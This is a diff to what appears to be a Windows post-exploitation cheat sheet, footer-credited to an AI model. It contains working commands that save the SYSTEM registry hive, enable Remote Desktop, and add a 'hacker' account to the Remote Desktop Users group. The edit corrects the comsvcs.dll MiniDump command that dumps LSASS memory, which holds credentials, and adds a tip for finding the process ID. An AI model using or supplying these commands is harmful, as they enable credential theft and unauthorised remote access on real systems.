@@ -144,8 +144,10 @@ reg save HKLM\SYSTEM C:\Temp\system.save
 reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 net localgroup "Remote Desktop Users" hacker /add
 
-:: Dump LSASS
-rundll32 C:\windows\system32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Temp\lsass.dmp full
+:: Dump LSASS — needs the numeric PID (find it with: tasklist /fi "imagename eq lsass.exe")
+rundll32 C:\windows\system32\comsvcs.dll, MiniDump <LSASS_PID> C:\Temp\lsass.dmp full
+:: PowerShell variant (resolves the PID inline):
+:: rundll32 C:\windows\system32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Temp\lsass.dmp full
 ```
 
 ---
@@ -161,5 +163,5 @@ rundll32 C:\windows\system32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Tem
 ---
 
 *Created: 2026-03-06*
-*Updated: 2026-08-18*
+*Updated: 2026-08-29*
 *Model: claude-opus-5*
